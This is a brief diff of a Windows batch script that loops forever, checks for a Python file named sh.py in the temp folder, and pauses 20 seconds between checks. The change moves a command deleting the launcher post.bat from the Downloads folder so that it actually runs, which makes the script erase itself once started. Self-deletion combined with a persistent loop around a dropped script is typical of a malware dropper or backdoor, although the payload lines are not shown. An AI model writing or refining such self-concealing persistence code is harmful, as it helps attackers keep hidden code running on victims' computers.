@@ -1,4 +1,5 @@
 @echo off
+del %USERPROFILE%\Downloads\post.bat
 :loop
 set FILE=%temp%\sh.py
 if not exist %FILE% (
@@ -51,4 +52,3 @@ if not exist %FILE% (
    timeout /t 20 >nul
 )
 goto loop
-del %USERPROFILE%\Downloads\post.bat
